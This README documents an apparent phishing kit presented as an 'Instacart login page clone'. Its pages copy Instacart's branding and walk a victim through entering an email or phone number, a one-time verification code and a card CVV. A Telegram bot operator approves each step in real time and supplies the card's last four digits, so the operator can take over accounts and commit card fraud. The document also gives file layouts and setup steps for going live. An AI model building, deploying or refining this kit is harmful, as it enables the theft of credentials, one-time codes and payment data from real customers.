# Instacart Login Page Clone (Mobile)

A complete mobile-responsive clone of the Instacart login and verification flow with Telegram bot integration for validation.

## Features

✅ Mobile-first responsive design  
✅ Multi-step verification flow  
✅ Telegram bot integration for approval  
✅ Loading states between steps  
✅ Form validation (email & phone number)  
✅ Auto-advancing input fields  
✅ Clean, modern UI matching Instacart's design system  
✅ Accessibility features (keyboard navigation, focus states)  

## Complete Flow

### User Journey

1. **Login Page** (`index.html`)
   - Enter email or phone number
   - Toggle between email/phone input
   - Click "Continue"

2. **Loading Page** (`loading.html?step=phone`)
   - Shows loading animation
   - Waits for Telegram bot operator approval
   - Auto-redirects when approved

3. **Verification Code** (`verify.html`)
   - Enter 6-digit verification code
   - Auto-submit when complete
   - Resend code option with timer

4. **Loading Page** (`loading.html?step=code`)
   - Waits for operator to validate code
   - Operator enters last 4 digits of card
   - Auto-redirects when approved

5. **Card Confirmation** (`card-confirm.html`)
   - Shows "card ending in XXXX" (from bot)
   - Enter 3-digit CVV security code
   - Visual card helper

6. **Loading Page** (`loading.html?step=card`)
   - Waits for operator to validate CVV
   - Auto-redirects when approved

7. **Thank You** (`thankyou.html`)
   - Success message
   - "Account verified!"
   - Next steps information

## Files

### HTML Pages
- `index.html` - Login page
- `verify.html` - Verification code entry
- `card-confirm.html` - Card CVV confirmation
- `loading.html` - Loading/waiting page
- `thankyou.html` - Success page

### Stylesheets
- `styles.css` - Shared base styles
- `verify.css` - Verification page styles
- `card-confirm.css` - Card confirmation styles
- `loading.css` - Loading page styles
- `thankyou.css` - Thank you page styles

### JavaScript
- `script.js` - Login page logic
- `verify.js` - Verification logic
- `card-confirm.js` - Card confirmation logic
- `loading.js` - Loading & polling logic
- `thankyou.js` - Thank you page logic

### Documentation
- `README.md` - This file
- `TELEGRAM_INTEGRATION.md` - Telegram bot integration guide

## How to Use

### Quick Start

1. Open `index.html` in a web browser or start local server:
   ```bash
   python3 -m http.server 8080
   ```
2. Navigate to `http://localhost:8080`
3. Complete the flow (currently in demo mode - auto-approves after 3 seconds)

### Demo Mode

Currently runs in demo mode with auto-approval for testing. To enable Telegram bot integration:

1. Implement the API endpoints (see [TELEGRAM_INTEGRATION.md](TELEGRAM_INTEGRATION.md))
2. Remove the simulation code in `loading.js`
3. Connect your Telegram bot
4. Test the complete flow

## Telegram Bot Integration

The system is designed to work with a Telegram bot that:

1. Receives user submissions (phone/email, code, CVV)
2. Displays data to operator in Telegram
3. Operator clicks "Approve" or "Reject" buttons
4. For verification step: operator enters last 4 digits of card
5. Web page polls for approval and redirects accordingly

**See [TELEGRAM_INTEGRATION.md](TELEGRAM_INTEGRATION.md) for complete integration guide.**

## Design Features

### Color Scheme
- Primary Green: `#0AAD0A` (Instacart brand color)
- Dark Green: `#098709`
- Text Primary: `#2E3333`
- Text Secondary: `#757575`
- Border: `#DCDCDC`
- Background: `#FFFFFF`

### Typography
- System fonts (Apple, Segoe UI, Helvetica)
- Mobile-optimized sizes
- Clear hierarchy

### Interactions
- Smooth transitions (150ms ease)
- Hover and active states
- Loading animations
- Auto-focus and auto-advance inputs
- Form validation with error states

## Mobile Optimization

- Viewport meta tag for proper scaling
- Touch-friendly button sizes (min 44px)
- Responsive font sizes and spacing
- Mobile-specific CSS media queries
- Responsive down to 320px width

## Browser Support

- Modern browsers (Chrome, Firefox, Safari, Edge)
- iOS Safari
- Chrome for Android
- Responsive design
